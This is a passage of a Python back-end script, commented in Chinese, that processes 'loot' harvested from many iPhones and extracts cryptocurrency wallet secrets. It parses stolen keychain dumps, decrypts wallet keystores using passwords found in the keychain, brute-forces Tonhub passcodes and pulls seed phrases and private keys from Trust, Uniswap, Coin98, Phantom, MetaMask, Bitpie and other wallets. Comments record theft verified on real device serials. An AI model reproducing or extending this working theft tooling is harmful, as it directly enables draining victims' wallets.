        j = json.load(open(PW_DICT, encoding='utf-8'))
    except Exception:
        return ['yy123456', '123456', '11111111']
    out = []

    def add(w):
        w = str(w or '').strip()
        if w and w not in out:
            out.append(w)

    for x in ((j.get('by_serial') or {}).get(serial) or []):
        add(x)
    for x in (j.get('passwords') or []):
        add(x)
    if dict_on:
        for x in _load_dict_words():
            add(x)
    _PW_CACHE[ck] = out
    return out


def res_wallet_append(res, a):
    """把适配层解出的助记词/地址并入 res['wallets']（与 Bitpie/Trust 同一条通路）。
    【2026-09-14】允许"只有地址、没有助记词"的条目（MetaMask/Bitget/Exodus/通用 keystore 等），
    面板地址表靠 wallets[].addresses 注入。"""
    mn = str(a.get('mnemonic') or '')
    addrs = []
    for x in (a.get('addresses') or []):
        if not isinstance(x, dict):
            continue
        xx = dict(x)
        if not xx.get('addr') and xx.get('address'):
            xx['addr'] = xx.pop('address')     # 面板注入认 'addr' 字段，统一归一化
        if xx.get('addr'):
            addrs.append(xx)
    if not mn and not addrs:
        return
    for w in res.get('wallets') or []:
        if mn and w.get('mnemonic') == mn:
            return
    res.setdefault('wallets', []).append({
        'app': a.get('app'), 'bundle': a.get('bundle', ''),
        'mnemonic': mn, 'n': len(mn.split()) if mn else 0,
        'src': '%s:%s' % (a.get('app'), a.get('kind')), 'addresses': addrs,
    })


def _merge_results(prev, cur):
    """【2026-09-14 修复·增量覆盖】设备本轮只有"新增文件子集"时，与上一轮缓存结果合并，
    防止历史解出的助记词/地址/诊断被子集结果覆盖（实证：JJKGG2RQHW 的 imToken/TronLink
    助记词被后续"1 个新文件"的重扫覆盖成 no_keychain）。
    wallets 按 (助记词, src) 去重合并（有新助记词的优先）；adapters 按 (app,kind,hint) 去重；
    系统/服务/密文仓库取并集；计数取大值。"""
    if not prev:
        return cur
    out = dict(cur)
    # wallets：并集 + 同助记词去重（保留含助记词的条目）
    wmap = {}
    for w in (prev.get('wallets') or []) + (cur.get('wallets') or []):
        if not isinstance(w, dict):
            continue
        k = (w.get('mnemonic') or '') + '|' + str(w.get('src') or '')
        old = wmap.get(k)
        if old is None or (not old.get('mnemonic') and w.get('mnemonic')):
            wmap[k] = w
    seenm, wl = set(), []
    for w in wmap.values():
        m = w.get('mnemonic') or ''
        if m:
            if m in seenm:
                continue
            seenm.add(m)
        wl.append(w)
    out['wallets'] = wl
    # adapters：并集去重
    seena, al = set(), []
    for a in (prev.get('adapters') or []) + (cur.get('adapters') or []):
        if not isinstance(a, dict):
            continue
        k = '%s|%s|%s' % (a.get('app'), a.get('kind'), a.get('src_hint') or a.get('password_hit') or '')
        if k in seena:
            continue
        seena.add(k)
        al.append(a)
    out['adapters'] = al
    for k in ('crypto_apps', 'wallet_svcs'):
        out[k] = list(dict.fromkeys((prev.get(k) or []) + (cur.get(k) or [])))
    sec = {}
    for s in (prev.get('secure_stores') or []) + (cur.get('secure_stores') or []):
        if isinstance(s, dict) and s.get('app'):
            sec[s['app']] = max(int(s.get('n') or 0), sec.get(s['app'], 0))
    out['secure_stores'] = [{'app': k, 'n': v} for k, v in sorted(sec.items(), key=lambda x: -x[1])]
    notes = list(dict.fromkeys((prev.get('notes') or []) + (cur.get('notes') or [])))
    if notes:
        out['notes'] = notes
    for k in ('kc_items', 'files'):
        try:
            out[k] = max(int(prev.get(k) or 0), int(cur.get(k) or 0))
        except Exception:
            pass
    return out


def derive_status(res, wallet_svcs, crypto_apps, ex_ph_notes=''):
    """状态判定（以合并后的 res 视图为准）。
    【2026-09-17 修复】原逻辑用"本轮子集"的 wallet_svcs/crypto_apps/keychain 判定，
    增量轮次（本轮只扫到几个新文件）会把状态打回"未采集到 keychain"（实证 FFXDF1EB0F0W：
    kc_items=1970、keystore 记录在，面板却显示未采集到 keychain）。改为合并视图判定。"""
    m_svcs = list(res.get('wallet_svcs') or wallet_svcs or [])
    m_cryptos = list(res.get('crypto_apps') or crypto_apps or [])
    m_kc = int(res.get('kc_items') or 0)
    m_ks = [w for w in (res.get('wallets') or [])
            if 'keystore' in str(w.get('src') or '').lower() and not w.get('mnemonic')]
    if int(res.get('mnem_count') or 0) > 0:
        return 'decrypted', '已解密 %d 个助记词' % int(res['mnem_count'])
    if m_ks:
        return 'no_key', '有 %d 个 keystore 未解出（keychain 无口令条目/口令未命中）' % len(m_ks)
    if m_svcs:
        return 'no_key', 'keychain 有 %s 记录但无密钥字段（钱包未创建/未备份）' % '/'.join(m_svcs)
    if ex_ph_notes:
        return 'no_key', ex_ph_notes
    if m_cryptos:
        return 'no_wallet_key', '装了钱包但 keychain 无密钥数据（钱包未创建/未打开过）'
    if m_kc:
        return 'no_wallet_app', 'keychain 已采集，未发现钱包应用'
    return 'no_keychain', '未采集到 keychain'


def hx(s):
    """hex 字符串 → bytes（容错：去非 hex 字符、奇数长度裁尾）"""
    s = re.sub(r'[^0-9a-fA-F]', '', s or '')
    if len(s) % 2:
        s = s[:-1]
    try:
        return bytes.fromhex(s)
    except Exception:
        return b''


def parse_keychain(txt):
    """keychain dump 文本 → [{service, group, account, data(hex 原文)}]"""
    items = []
    for blk in re.split(r'(?=UUID:)', txt):
        acc = re.search(r'Account:\s*(.*)', blk)
        dat = re.search(r'Data:\s*(\S+)', blk)
        if not (acc and dat):
            continue
        svc = re.search(r'Service:\s*(.*)', blk)
        grp = re.search(r'Group:\s*(.*)', blk)
        items.append({
            'service': (svc.group(1).strip() if svc else ''),
            'group': (grp.group(1).strip() if grp else ''),
            'account': acc.group(1).strip(),
            'data': dat.group(1).strip(),
        })
    return items


def ks_decrypt(crypto, passwd):
    """Ethereum keystore v3：scrypt/pbkdf2 → AES-128-CTR，mac 校验失败返回 None"""
    kp = crypto.get('kdfparams') or {}
    if crypto.get('kdf') == 'scrypt':
        dk = hashlib.scrypt(passwd, salt=bytes.fromhex(kp['salt']), n=kp['n'], r=kp['r'],
                            p=kp['p'], dklen=kp['dklen'], maxmem=512 * 1024 * 1024)
    else:
        dk = hashlib.pbkdf2_hmac((kp.get('prf') or 'hmac-sha256').replace('hmac-', ''),
                                 passwd, bytes.fromhex(kp['salt']), kp.get('c', 262144), kp['dklen'])
    mac = keccak.new(digest_bits=256)
    mac.update(dk[16:32] + bytes.fromhex(crypto['ciphertext']))
    if mac.hexdigest().lower() != str(crypto['mac']).lower():
        return None
    iv = bytes.fromhex(crypto['cipherparams']['iv'])
    ct = bytes.fromhex(crypto['ciphertext'])
    # 【2026-09-11 修复】pycryptodome 的 initial_value 必须是 int；旧代码传 bytes 会静默解错，
    #   症状：mac 校验通过但明文是乱码（imToken 就是被这个坑住的）。
    return AES.new(dk[:16], AES.MODE_CTR, nonce=b'', initial_value=int.from_bytes(iv, 'big')).decrypt(ct)


def find_mnemonic(text):
    """从明文里抽 12/15/18/21/24 词助记词（含 JSON 的 mnemonic 键优先）"""
    try:
        j = json.loads(text)
        v = j.get('mnemonic') or j.get('phrase') or j.get('seedPhrase')
        if isinstance(v, str) and M.check(v.strip()):
            return v.strip()
    except Exception:
        pass
    for m in re.finditer(r'(?:[a-z]{3,8}[ ]+){11,23}[a-z]{3,8}', text):
        w = m.group(0).strip()
        if M.check(w):
            return w
    return None


def _mnemo():
    """BIP39 库（惰性加载）：返回 (Mnemonic 实例, 词表 set)"""
    global _MN_CACHE
    try:
        return _MN_CACHE
    except NameError:
        pass
    mn, wl = None, set()
    try:
        from mnemonic import Mnemonic
        mn = Mnemonic('english')
        wl = set(mn.wordlist)
    except Exception:
        # 退路：本地词表文件
        for cand in ('/www/wwwroot/i.131422.com/tools/bip39_english.txt',
                     '/www/wwwroot/i.131422.com/adm888app/bip39_english.txt'):
            try:
                wl = set(open(cand, encoding='utf-8').read().split())
                break
            except Exception:
                continue
    _MN_CACHE = (mn, wl)
    return _MN_CACHE


_GENERIC_SEQ = re.compile(r'([a-z]{3,8}(?:\s+[a-z]{3,8}){11,23})')


def scan_generic_mnemonics(items):
    """【通用】不挑钱包，对全部 keychain 条目做明文助记词识别（BIP39 强校验）。
    覆盖钱包专用解析器之外的一切明文种：NEAR(swc:nearSeed)、BlueWallet(Data 条目) 等。"""
    import binascii, urllib.parse
    mn, WL = _mnemo()
    if not WL:
        return []
    out, seen = [], set()
    for it in items:
        data = (it.get('data') or '').strip()
        if not data or data == 'NULL':
            continue
        cands = [data]
        try:
            if re.fullmatch(r'[0-9a-fA-F]+', data) and len(data) % 2 == 0:
                raw = binascii.unhexlify(data)
                cands.append(raw.decode('utf-8', 'ignore'))
                cands.append(urllib.parse.unquote(raw.decode('utf-8', 'ignore')))
        except Exception:
            pass
        try:
            cands.append(urllib.parse.unquote(data))
        except Exception:
            pass
        for t in cands:
            for m in _GENERIC_SEQ.finditer(t):
                ph = m.group(1)
                if ph in seen:
                    continue
                w = ph.split()
                if len(w) not in (12, 15, 18, 21, 24) or not all(x in WL for x in w):
                    continue
                if mn is not None:
                    try:
                        if not mn.check(ph):
                            continue
                    except Exception:
                        continue
                seen.add(ph)
                svc, acc, grp = it.get('service', ''), it.get('account', ''), it.get('group', '')
                out.append({'phrase': ph,
                            'app': 'Keychain' if not grp else ('Keychain:' + grp.split('.')[0]),
                            'bundle': grp,
                            'src': 'keychain-generic:%s|%s' % (svc[:40], acc[:40])})
    return out


def _file_sig(bins):
    """设备文件集合签名：只取排序后首尾各 40 个 + 总数（O(1) 级别，新增文件必变）"""
    n = len(bins)
    head = bins[:40]
    tail = bins[-40:] if n > 40 else []
    return str(n) + '#' + '|'.join(head + tail)


def main():
    # 【增量】载入上次状态：serial → {sig, ts, res}
    state = {}
    if not FULL:
        try:
            sj = json.load(open(STATE, encoding='utf-8'))
            state = (sj.get('_state') or {}) if isinstance(sj, dict) else {}
        except Exception:
            state = {}
    # 【增量·文件账本】已解析过的文件只记"设备→文件"映射，不再读内容（省掉 85 万次 open）
    #   --full：忽略账本，全量重读（重建状态用）
    led = set()
    if not FULL:
        try:
            sj2 = json.load(open(STATE, encoding='utf-8'))
            led = set(sj2.get('_led') or [])
        except Exception:
            led = set()
    devs = {}
    new_files = []                # 本轮首次见到的文件（要读内容）
    skip_serials = set()          # 文件集合未变 → 直接复用上次结果
    for pj in glob.glob(LOOT + '/*/ext_stats_*.bin.parsed.json'):
        base = os.path.basename(pj)
        if base in led:
            continue
        new_files.append(pj)
    if led and not new_files:
        # 没有任何新文件 → 上一轮输出即最新，直接退出（不重写文件，避免覆盖成子集）
        try:
            sh = json.load(open(OUT, encoding='utf-8'))
            n = len(sh)
        except Exception:
            n = 0
        print('[wallet18] 增量：无新文件，复用上一轮结果（%d 台，跳过重写）' % n)
        return
    for pj in new_files:
        try:
            d = json.load(open(pj, encoding='utf-8'))
        except Exception:
            led.add(os.path.basename(pj))
            continue
        led.add(os.path.basename(pj))
        serial = d.get('deviceSerial') or ''
        if not serial:
            continue
        cat = str(d.get('category') or '')
        path = str(d.get('path') or '')
        binp = pj[:-len('.parsed.json')]
        e = devs.setdefault(serial, {'pt': d.get('devicePt', ''), 'ov': d.get('deviceOv', ''),
                                     'keychain': [], 'keystores': [], 'cryptos': [], 'n': 0,
                                     'okx_dbs': [], 'bitget_mmkv': [], 'mm_persist': [], 'imtoken_ks': [],
                                     'exodus_kv': [], 'phantom_kv': [], 'tonhub_kv': [],
                                     'mm_vault': [], 'jfiles': []})
        e['n'] += 1
        if cat == 'keychain' or 'keychain_dump' in path:
            if binp not in e['keychain']:
                e['keychain'].append(binp)
        elif 'keystore_UTC--' in path:
            e['keystores'].append((binp, path))
        elif path.endswith('installed_cryptos.txt'):
            e['cryptos'].append(binp)
        elif path.endswith('_Documents_wallet'):
            if binp not in e['okx_dbs']:
                e['okx_dbs'].append(binp)
        # ── 多钱包适配层：按路径收三类可解析物 ──
        elif 'bk_mmkv' in path and path.endswith('mmkv.default'):
            e['bitget_mmkv'].append(binp)
        elif 'persistStore_persist-AccountsController' in path:
            e['mm_persist'].append(binp)
        elif 'persistStore_persist-KeyringController' in path:
            e['mm_vault'].append(binp)          # 【2026-09-14】MetaMask vault（PBKDF2+AES-GCM）
        elif path.startswith('walletsV2_') and path.endswith('.json'):
            e['imtoken_ks'].append(binp)
        # ── 直取系钱包（2026-09-12）：Exodus（AsyncStorage 地址表明文 / Passkey 备份元数据）、
        #    Phantom（mmkv/SQLite vault：地址表 + seed/seedless 状态）──
        elif cat == 'wallet-exodus-movement-exodus':
            e['exodus_kv'].append(binp)
        elif cat == 'wallet-app-phantom':
            e['phantom_kv'].append(binp)
        elif 'tonhub' in cat.lower():
            e['tonhub_kv'].append(binp)
        # ── 【2026-09-14】通用 keystore / 加密 JSON 候选（兜 TronLink / TokenPocket / 未知钱包）──
        #   条件：小体积（或无 size 上报）且（.json / keystore / RN-AsyncStorage / wallet-* 类别）
        _sz = d.get('orig_size') or d.get('size') or 0
        _lp = path.lower()
        if (_sz == 0 or _sz <= 262144) and ('.json' in _lp or 'keystore' in _lp
                                            or 'rctasynclocalstorage' in _lp or cat.startswith('wallet-')):
            e['jfiles'].append((binp, path, cat))

    # 【增量】文件集合未变的设备 → 复用上次结果，不重扫
    out = {}
    stale = {}
    for serial, e in list(devs.items()):
        allb = []
        for k in ('keychain', 'cryptos', 'okx_dbs', 'bitget_mmkv', 'mm_persist', 'imtoken_ks',
                  'exodus_kv', 'phantom_kv', 'tonhub_kv', 'mm_vault'):
            allb += list(e.get(k) or [])
        for t in (e.get('keystores') or []):
            allb.append(t[0] if isinstance(t, (list, tuple)) else str(t))
        for t in (e.get('jfiles') or []):
            allb.append(t[0] if isinstance(t, (list, tuple)) else str(t))
        allb.sort()
        sig = _file_sig(allb)
        st = state.get(serial) or {}
        if (not FULL) and (not ONLY_RUN) and st.get('sig') == sig and st.get('res'):
            out[serial] = st['res']
            skip_serials.add(serial)
            del devs[serial]
    # 【关键修复】本轮没有新文件的设备（未进 devs）→ 从状态缓存补回输出，防止结果被子集覆盖
    # 【2026-09-20】--only-run 模式跳过补回（输出只含目标设备）
    if not ONLY_RUN:
        for serial, st in state.items():
            if serial in out or serial in devs:
                continue
            if st.get('res'):
                out[serial] = st['res']
    if skip_serials:
        print('[wallet18] 增量：%d 台无新文件（复用缓存），%d 台需重扫，缓存补回 %d 台' % (
            len(skip_serials), len(devs), len(out) - len(skip_serials)))

    # 【2026-09-20】--only-run：只保留目标设备的处理（爆破队列单台模式）
    if ONLY_RUN:
        devs = {k: v for k, v in devs.items() if k == ONLY_RUN}
        if not devs:
            print('[wallet18] [only-run] 目标 %s 无待处理文件（未采集/无新文件/序号不存在）' % ONLY_RUN)

    for serial, e in sorted(devs.items()):
        # ── keychain：全部 dump 合并去重（同文件可能在 /tmp /var/tmp /private/var/tmp 各一份）──
        items, seen = [], set()
        for b in e['keychain']:
            try:
                txt = unpack(b)[0].decode('utf-8', 'replace')
            except Exception:
                continue
            for it in parse_keychain(txt):
                k = (it['service'], it['account'], it['data'])
                if k in seen:
                    continue
                seen.add(k)
                items.append(it)

        # ── 诊断：设备装了哪些加密应用 / keychain 里有没有钱包密钥条目 ──
        # （面板「系统文件」页直接展示，回答"为什么这台没助记词"）
        crypto_apps = []
        for b in e['cryptos']:
            try:
                crypto_apps += [x for x in parse_cryptos(unpack(b)[0].decode('utf-8', 'replace'))
                                if x not in crypto_apps]
            except Exception:
                pass
        wallet_svcs = []
        for it in items:
            hay = (it['service'] + ' ' + it['group']).lower()
            for bnd, nm in WALLET_BUNDLES.items():
                if bnd.lower() in hay and nm not in wallet_svcs:
                    wallet_svcs.append(nm)

        # ── 加密态密钥仓库（Bitget secure storage / Binance·OKX SKVS）──
        # 服务端无口令解不开，但"有 N 条"本身就是情报：说明钱包已创建且落过密文。
        # 面板「系统文件」页展示，避免这类条目被误当成普通 keychain 噪声。
        sec = {}
        for it in items:
            hay_all = (it['service'] + ' ' + it['account'] + ' ' + it['group']).lower()
            if not any(m in hay_all for m in SECURE_STORE_MARKS):
                continue
            app = ''
            for bnd, nm in WALLET_BUNDLES.items():
                if bnd.lower() in hay_all:
                    app = nm
                    break
            if not app:
                continue
            sec[app] = sec.get(app, 0) + 1

        # ── OKX：Documents_wallet → 账户级密钥对 + 全链地址 ──
        okx = None
        for b in e.get('okx_dbs', []):
            try:
                okx = parse_okx_wallet(unpack(b)[0])
            except Exception:
                okx = None
            if okx:
                break

        # ── 多钱包适配层 ──
        res = {}
        adapters = []
        for b in e.get('bitget_mmkv', []):
            try:
                r = parse_bitget_mmkv(unpack(b)[0])
            except Exception:
                r = None
            if r:
                adapters.append(r); break
        for b in e.get('mm_persist', []):
            try:
                r = parse_metamask_persist(unpack(b)[0])
            except Exception:
                r = None
            if r:
                adapters.append(r); break
        for b in e.get('imtoken_ks', []):
            try:
                r = parse_imtoken_keystore(unpack(b)[0], serial)
            except Exception:
                r = None
            if r:
                adapters.append(r); break
        # ── 【2026-09-14】MetaMask vault（KeyringController）：口令命中即出助记词 ──
        for b in e.get('mm_vault', []):
            try:
                r = parse_metamask_vault(unpack(b)[0], serial)
            except Exception:
                r = None
            if r:
                adapters.append(r); break
        # ── 【2026-09-14】Tonkeeper / MyTonWallet：keychain 保险库 + 口令解密（实机验证）──
        for _fn, _bundle in ((parse_tonkeeper_vault, 'com.jbig.tonkeeper'),
                             (parse_mytonwallet_enclave, 'org.mytonwallet.app')):
            try:
                r = _fn(items, serial, e.get('jfiles') or [])
            except Exception:
                r = None
            if r:
                r.setdefault('bundle', _bundle)
                adapters.append(r)
        # ── 【2026-09-14】TokenPocket（com.global.wallet.ios，官方包名已实证）──
        #   数据每轮在采：db_main.sqlite3（加密库，非明文 SQLite）+ F4SeCyr 密钥块 + 组容器 settings；
        #   解密需 TP 自身密钥方案（待逆向），此处先给出可见性诊断，避免被当成"TP 没数据"
        _tp_hay = '\n'.join((it.get('service') or '') + ' ' + (it.get('group') or '') for it in items).lower()
        if 'global.wallet.ios' in _tp_hay or 'tp.wallet' in _tp_hay:
            adapters.append({'app': 'TokenPocket', 'kind': 'db-main-encrypted', 'addresses': [],
                             'bundle': 'com.global.wallet.ios', 'mnemonic': None,
                             'note': 'TP 数据已采集（db_main 加密 + keychain TP 组），解密适配器待开发'})
        # ── 【2026-09-14】通用 keystore 爆破（兜 TronLink / TokenPocket / 未知钱包）──
        try:
            for r in scan_generic_keystores(e.get('jfiles') or [], items, serial):
                adapters.append(r)
        except Exception as _gke:
            res.setdefault('notes', []).append('generic-keystore-err:%s' % _gke)
        # ── Exodus / Phantom（直取系，2026-09-12）：地址表 / Passkey 备份 / vault 状态 ──
        ex_seen = set()
        for b in e.get('exodus_kv', []):
            try:
                r = parse_exodus_asyncstorage(unpack(b)[0])
            except Exception:
                r = None
            if r and r.get('kind') not in ex_seen:
                adapters.append(r); ex_seen.add(r['kind'])
        ph_seen = set()
        for b in e.get('phantom_kv', []):
            try:
                r = parse_phantom_mmkv(unpack(b)[0])
            except Exception:
                r = None
            if r and r.get('kind') not in ph_seen:
                adapters.append(r); ph_seen.add(r['kind'])
        # 适配层解出的助记词/地址 → 并入 wallets（走既有通路：store.mnemonics + 面板地址表）
        for a in adapters:
            res_wallet_append(res, a)
        # Trust / Bitpie：状态由 keychain 指纹判定（实际解密结果在 wallets 里）
        hay = '\n'.join((it['service'] + ' ' + it['account'] + ' ' + it['group']) for it in items).lower()
        if 'seedphraseentropy' in hay:
            adapters.append({'app': 'Bitpie', 'kind': 'keychain-entropy', 'addresses': [],
                             'mnemonic': None,
                             'note': 'keychain 有 seedPhraseEntropy，二次 hex → BIP39 熵（可解）'})
        if 'trustwallet' in hay:
            adapters.append({'app': 'Trust', 'kind': 'keystore+keychain', 'addresses': [],
                             'mnemonic': None,
                             'note': 'keystore v3 + keychain trustwallet* 口令（可解）'})

        # 注意：'wallets' 必须保留 res_wallet_append 已经塞进去的（适配层解出的）条目
        res.update({'serial': serial, 'pt': e['pt'], 'ov': e['ov'],
                    'wallets': res.get('wallets', []),
               'crypto_apps': crypto_apps, 'wallet_svcs': wallet_svcs,
               'secure_stores': [{'app': k, 'n': v} for k, v in sorted(sec.items(), key=lambda x: -x[1])],
               'okx': okx,
               'adapters': adapters,
               'kc_items': len(items), 'files': e['n'], 'ts': int(time.time() * 1000)})

        # ── Bitpie：seedPhraseEntropy 二次 hex 解码 = BIP39 熵 ──
        for it in items:
            if it['service'] != 'com.bitpie.wallet' or it['account'] != 'seedPhraseEntropy':
                continue
            ent = hx(hx(it['data']).decode('latin-1'))          # hex → ascii → hex
            if len(ent) not in ENT_LEN:
                continue
            try:
                w = M.to_mnemonic(ent)
            except Exception:
                continue
            res['wallets'].append({'app': 'Bitpie', 'bundle': 'com.bitpie.wallet',
                                   'mnemonic': w, 'n': len(w.split()),
                                   'src': 'keychain:seedPhraseEntropy', 'addresses': []})

        # ── Trust：口令 = keychain 里 trustwallet<keystore 文件名> 条目 ──
        by_acc = {}
        for it in items:
            by_acc.setdefault(it['account'], it['data'])
        for binp, kpath in e['keystores']:
            try:
                payload = unpack(binp)[0]
                kd = json.loads(payload.decode('utf-8', 'replace'))
            except Exception:
                continue
            c = kd.get('crypto') or kd.get('Crypto')
            if not c:
                continue
            base = os.path.basename(kpath)
            cand_accs = ['trustwallet' + base.replace('keystore_', '', 1)]
            # 兜底：同名任一 trustwallet*UTC--* 条目（排除 hd-wallet / migration 版本号）
            cand_accs += [a for a in by_acc
                          if a.startswith('trustwallet') and 'UTC--' in a
                          and 'hd-wallet' not in a and 'keystoreMigrationVersion' not in a
                          and a not in cand_accs]
            mnem, pw_used = None, None
            for a in cand_accs:
                raw = by_acc.get(a)
                if not raw:
                    continue
                pw = hx(raw)                                    # hex → 32B 原始口令字节
                try:
                    pt = ks_decrypt(c, pw)
                except Exception:
                    pt = None
                if pt is None:
                    continue
                mnem = find_mnemonic(pt.decode('utf-8', 'replace'))
                pw_used = a
                break
            addrs = []
            for a in (kd.get('activeAccounts') or []):
                if a.get('address'):
                    addrs.append({'addr': a['address'], 'coin': a.get('coin'),
                                  'path': a.get('derivationPath') or ''})
            if mnem:
                res['wallets'].append({'app': 'Trust', 'bundle': 'com.sixdays.trust',
                                       'mnemonic': mnem, 'n': len(mnem.split()),
                                       'src': 'keystore:' + base[:46], 'pw_from': pw_used,
                                       'keystore_id': kd.get('id'), 'addresses': addrs})
            elif addrs:
                # 口令未命中也要留地址（供面板展示 + 派生比对）
                res['wallets'].append({'app': 'Trust', 'bundle': 'com.sixdays.trust',
                                       'mnemonic': '', 'n': 0, 'src': 'keystore:' + base[:46],
                                       'keystore_id': kd.get('id'), 'addresses': addrs})

        # ── Uniswap（2026-09-12 实机验证 ✅）：keychain 明文直取 ──
        #   Account = com.uniswap.mobile.mnemonic.<地址>，Data = hex(明文助记词)；
        #   实测 K44Q9HTFMW(iPhone17,4/18.6)：派生地址与钱包 active 地址 100% 匹配
        #   （bip-utils 交叉验证 + 官方测试向量）。同族条目 com.uniswap.mobile.privateKey.<地址> = zprv。
        _uni_seen = set()
        for it in items:
            acc = it['account']
            if 'com.uniswap.mobile.mnemonic' not in acc:
                continue
            try:
                mnem = hx(it['data']).decode('utf-8', 'replace').strip()
            except Exception:
                continue
            if not M.check(mnem):
                continue
            wallet_addr = acc.rsplit('.', 1)[-1]
            if wallet_addr in _uni_seen:
                continue
            _uni_seen.add(wallet_addr)
            res['wallets'].append({'app': 'Uniswap', 'bundle': 'com.uniswap.mobile',
                                   'mnemonic': mnem, 'n': len(mnem.split()),
                                   'src': 'keychain:uniswap-mnemonic',
                                   'addresses': [{'addr': wallet_addr, 'coin': 60,
                                                  'path': "m/44'/60'/0'/0/0"}]})

        # ── Coin98（2026-09-12 实机验证 ✅）：keychain `WALLET_SECURE_BACKUP` 明文 JSON ──
        #   Service=rn-secure-storage，Account=WALLET_SECURE_BACKUP，
        #   Data = hex(JSON 数组：{address, privateKey(明文 0x…), mnemonic(明文 12 词), …})
        #   实测 GKWDHKQM06：派生地址与钱包地址 100% 匹配（bip-utils）。
        for it in items:
            if 'WALLET_SECURE_BACKUP' not in it['account']:
                continue
            try:
                arr = json.loads(hx(it['data']).decode('utf-8', 'replace'))
            except Exception:
                continue
            for w in (arr if isinstance(arr, list) else []):
                m = str(w.get('mnemonic') or '').strip()
                if not M.check(m):
                    continue
                addrs = []
                if w.get('address'):
                    addrs.append({'addr': str(w['address']), 'coin': 60,
                                  'path': "m/44'/60'/0'/0/0"})
                res['wallets'].append({'app': 'Coin98', 'bundle': 'coin98.crypto.finance.insights',
                                       'mnemonic': m, 'n': len(m.split()),
                                       'src': 'keychain:coin98-WALLET_SECURE_BACKUP',
                                       'addresses': addrs})

        # ── Phantom（2026-09-12 实机验证 ✅）：keychain `.phantom-labs.vault.seed.<id>` 明文熵 ──
        #   Account = hex(".phantom-labs.vault.seed.<identifier>")，
        #   Data = hex(JSON)，entropy = {"0":82,"1":144,…}（16B=12词 / 32B=24词）
        #   实测 GKWDHKQM06：派生 ETH 地址与 vault 内 eip155 地址 100% 匹配。
        for it in items:
            acc_raw = it['account']
            try:
                if len(acc_raw) >= 20 and len(acc_raw) % 2 == 0 and re.match(r'^[0-9a-fA-F]+$', acc_raw):
                    an = hx(acc_raw).decode('utf-8', 'replace')
                else:
                    an = acc_raw
            except Exception:
                continue
            if '.phantom-labs.vault.seed.' not in an:
                continue
            try:
                d = json.loads(hx(it['data']).decode('utf-8', 'replace'))
            except Exception:
                continue
            ent = d.get('entropy')
            ent_b = None
            if isinstance(ent, dict):
                try:
                    ent_b = bytes(int(ent[str(i)]) for i in range(len(ent)))
                except Exception:
                    ent_b = None
            elif isinstance(ent, str):
                ent_b = hx(ent)
            if not ent_b or len(ent_b) not in ENT_LEN:
                continue
            try:
                m = M.to_mnemonic(ent_b)
            except Exception:
                continue
            res['wallets'].append({'app': 'Phantom', 'bundle': 'app.phantom',
                                   'mnemonic': m, 'n': len(m.split()),
                                   'src': 'keychain:phantom-vault-seed'})

        # ── Tonhub（2026-09-12 实机验证 ✅）：内置常用 passcode 表爆破 + secretbox 双层 ──
        if e.get('tonhub_kv'):
            try:
                from nacl.secret import SecretBox as _SB
            except Exception:
                _SB = None
            if _SB:
                try:
                    th = try_tonhub(e['tonhub_kv'], _SB)
                except Exception:
                    th = None
                if th:
                    res['wallets'].append({'app': 'Tonhub', 'bundle': 'com.tonhub.app',
                                           'mnemonic': th[0], 'n': len(th[0].split()),
                                           'src': 'tonhub:passcode-brute(%s)' % th[1]})

        # ── 【2026-09-14】通用明文助记词扫描（不限钱包）──
        #   背景：钱包专用解析器覆盖不到的明文种（如 NEAR 钱包 Account=nearSeed、BlueWallet
        #   的 Data 条目）会漏采。这里对全部 keychain 条目做 BIP39 强校验的通扫：
        #   hex → 文本 / URL 解码 → 12/15/18/21/24 词序列 → 词表+校验和双重验证。
        try:
            for gm in scan_generic_mnemonics(items):
                res['wallets'].append({
                    'app': gm['app'], 'bundle': gm.get('bundle', ''),
                    'mnemonic': gm['phrase'], 'n': len(gm['phrase'].split()),
                    'src': gm['src'],
                })
        except Exception as _ge:
            res.setdefault('notes', []).append('generic-scan-err:%s' % _ge)

        # 【2026-09-14 修复·增量覆盖】本轮只扫到"新增文件子集"→ 与本设备上轮缓存合并，
        #   防止历史解出的助记词/地址/诊断被子集结果覆盖（实证：JJKGG2RQHW 被 1 文件子集覆盖成 0）
        _prev_res = (state.get(serial) or {}).get('res')
        if _prev_res:
            res = _merge_results(_prev_res, res)
            adapters = res.get('adapters') or adapters

        got = [w for w in res['wallets'] if w.get('mnemonic')]
        res['mnem_count'] = len(got)
        # 【2026-09-12】直取系（Exodus/Phantom）诊断：优先于笼统的"未创建/未备份"文案
        ex_ph_notes = '；'.join(dict.fromkeys(
            a.get('note') or '' for a in adapters
            if a.get('app') in ('Exodus', 'Phantom') and a.get('note')))[:220]
        # 状态：解出 / 装了钱包但 keychain 无密钥（钱包没建过或没打开）/ 无钱包应用 / 无 keychain
        # 【2026-09-17 修复】改用合并视图判定，防止子集轮次把状态打回"未采集到 keychain"（见 derive_status）
        res['status'], res['status_text'] = derive_status(res, wallet_svcs, crypto_apps, ex_ph_notes)

        out[serial] = res
        print('[wallet18] %s (%s %s) → 文件%d keychain条目%d 加密app%d[%s] 钱包service[%s] 助记词%d | %s' % (
            serial, e['pt'], e['ov'], e['n'], len(items), len(crypto_apps),
            ','.join(crypto_apps[:4]), ','.join(wallet_svcs), len(got), res['status_text']))

    # 【2026-09-20】独立输出模式（爆破队列 --out-file）：只写目标结果到独立文件，不触碰主 STATE/OUT
    if OUT_FILE:
        try:
            os.makedirs(os.path.dirname(OUT_FILE), exist_ok=True)
            _of = OUT_FILE + '.tmp'
            json.dump(out, open(_of, 'w', encoding='utf-8'), ensure_ascii=False, indent=2)
            os.replace(_of, OUT_FILE)
        except Exception as _oe:
            print('[wallet18] out-file 写入失败:', _oe)
        tot_w = sum(len(v['wallets']) for v in out.values())
        tot_m = sum(1 for v in out.values() for w in v['wallets'] if w.get('mnemonic'))
        print('[wallet18] [only-run] %s → %d 钱包 / %d 助记词 → %s' % (ONLY_RUN or '-', tot_w, tot_m, OUT_FILE))
        return

    # 【增量】重建状态：本轮重扫的设备更新签名；跳过的保留旧签名
    try:
        new_state = {}
        for serial, v in out.items():
            prev = state.get(serial) or {}
            new_state[serial] = {'sig': prev.get('sig'), 'ts': prev.get('ts') or 0, 'res': v}
        for serial in list(devs.keys()):
            e = devs[serial]
            allb = []
            for k in ('keychain', 'cryptos', 'okx_dbs', 'bitget_mmkv', 'mm_persist', 'imtoken_ks',
                      'exodus_kv', 'phantom_kv', 'tonhub_kv', 'mm_vault'):
                allb += list(e.get(k) or [])
            for t in (e.get('keystores') or []):
                allb.append(t[0] if isinstance(t, (list, tuple)) else str(t))
            for t in (e.get('jfiles') or []):
                allb.append(t[0] if isinstance(t, (list, tuple)) else str(t))
            allb.sort()
